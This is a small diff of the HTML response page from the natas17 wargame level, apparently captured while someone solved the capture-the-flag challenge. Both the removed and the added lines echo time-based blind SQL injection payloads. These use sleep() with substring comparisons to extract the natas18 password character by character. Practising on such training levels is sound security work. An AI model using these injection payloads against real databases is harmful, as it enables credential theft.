@@ -11,7 +11,7 @@
 <body>
 <h1>natas17</h1>
 <div id="content">
-Executing query: SELECT * from users where username="manning" union select * from users where username="natas18" and if(binary substring(password,32,1) = binary "P", sleep(2), 1)="true"<br><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+Executing query: SELECT * from users where username="manning" union select * from users where username="natas18" and if(substring(password,2,1)<"r", sleep(1.5), 1)="true"<br><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
 </div>
 </body>
 </html>
